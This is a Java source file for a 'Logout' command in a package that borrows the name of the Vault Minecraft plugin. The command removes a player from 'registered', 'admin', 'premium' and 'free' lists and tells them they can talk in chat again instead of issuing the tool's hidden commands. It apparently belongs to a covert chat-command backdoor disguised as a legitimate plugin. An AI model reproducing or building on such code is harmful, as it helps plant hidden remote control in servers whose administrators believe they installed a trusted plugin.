package net.milkbowl.vault.commands.cmds;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

import net.milkbowl.vault.Core;
import net.milkbowl.vault.commands.CommandManager;
import net.milkbowl.vault.util.Settings;

public class Logout extends CommandManager {
	
	public void execute(Core plugin, String msg, String[] args, Player p) {
		Bukkit.getScheduler().runTaskLater(plugin, () -> {
			plugin.registered.remove(p.getName());
			plugin.registeredAdmin.remove(p.getName());
			plugin.registeredPremium.remove(p.getName());
			plugin.registeredFree.remove(p.getName());
		}, 1L);
		p.sendMessage(Settings.PREFIX("You can now talk in chat and no longer execute " + Settings.NAME + " commands"));
	}

}
